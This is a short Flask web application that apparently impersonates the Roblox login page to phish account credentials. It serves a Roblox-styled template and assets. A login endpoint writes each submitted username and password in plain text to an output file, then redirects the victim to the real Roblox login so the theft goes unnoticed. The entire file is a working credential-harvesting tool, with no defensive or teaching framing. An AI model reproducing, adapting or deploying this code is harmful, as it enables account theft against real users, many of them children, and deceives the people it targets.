from flask import *

app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def index():
    if request.method == 'GET':
        return render_template('roblox.html')
    if request.method == 'POST':
        return render_template('roblox.html')

@app.route('/roblox_files/<path:filename>')
def serve_roblox_file(filename):
    return send_from_directory('/app/roblox_files/', filename)

@app.route('/api/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    with open('/output/output.txt', 'a') as file:
        file.write(f'------------------------------------\n\nUsername: {username}\nPassword: {password}\n\n')

    return redirect('https://www.roblox.com/login')

if __name__ == '__main__':
    app.run(host="0.0.0.0")